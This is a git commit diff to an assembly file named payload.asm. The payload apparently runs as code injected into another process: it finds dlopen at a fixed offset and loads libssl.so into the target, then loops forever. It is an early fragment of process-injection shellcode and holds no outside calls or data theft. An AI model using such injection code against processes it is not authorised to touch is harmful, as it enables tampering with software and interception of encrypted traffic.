58e38c41a09bd434ea24ff828475ce6accec1f96
B Horn <b@horn.uk>
2024-06-29 05:07:18 +0100

    calling dlopen()
    Signed-off-by: B Horn <b@horn.uk>

--- payload/payload.asm
+++ payload/payload.asm
@@ -1,11 +1,28 @@
 BITS 64
 
+%define _dlopen $_main - 22
+%define _dlsym $_main - 11
+
 
 _main:
     endbr64
-    jmp $_main - 11
+    push rbp
+    push rbx
+    call _wrap
 _inf:
     jmp _inf
     nop
     nop
     nop
+
+_wrap:
+    endbr64
+    xor rax, rax
+    mov rsi, 1
+    lea rdi, [rel _str_libssl]
+    call _dlopen
+    ret
+
+_str_libssl:
+    db "/usr/lib/x86_64-linux-gnu/libssl.so"
+    db 0
